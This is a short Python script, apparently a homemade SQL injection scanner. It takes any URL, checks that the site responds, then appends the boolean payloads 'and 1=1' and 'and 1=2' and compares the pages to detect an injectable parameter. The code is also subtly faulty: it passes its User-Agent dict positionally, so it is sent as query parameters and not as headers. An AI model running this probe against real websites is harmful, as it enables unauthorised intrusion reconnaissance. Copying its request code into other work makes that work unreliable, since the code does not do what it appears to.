#!/usr/bin/python
import  requests
import socket
import time

def sql():
    global url
    url=input('[^]Please enter the URL that needs test injection：').lower()
    if url !=None:
        time.sleep(0.5)
        header={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'}
        print('[1]GET')
        print('[2]POST')
        lwd=input('[^]Please enter what kind of method you want to ask for：')
        if lwd=="1":
            r=requests.get(url,header)
            status=r.status_code
            if status == 200:
                print('\033[1;32;40m')
                print('[^]Link stability')
                print('\033[0m')
            else:
                print('\033[1;31;40m')
                print('[~]State code',status)
                print('[^]Response code')
                print('\033[0m')
                exit()
        elif lwd=="2":
            r=requests.post(url,header)
            status=r.status_code
            if status == 200:
                print('\033[1;32;40m')
                print('[^]Link stability')
                print('\033[0m')
            else:
                print('\033[1;31;40m')
                print('[~]State code', status)
                print('[^]Response code')
                print('\033[0m')
                exit()
        else:
            print('[~]Not Found')
            exit()
sql()

def zhuru():
    headers={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36'}
    url1=url+'%20and%201=1'
    url2=url+'%20and%201=2'
    zhusx=requests.get(url,headers).content
    zhus=requests.get(url1,headers).content
    zhuss=requests.get(url2,headers).content
    if zhusx == zhus and zhusx !=zhuss:
        print('[^]Discovery of injection point')
    else:
        print('[~]No injection point was found')
        exit()

zhuru()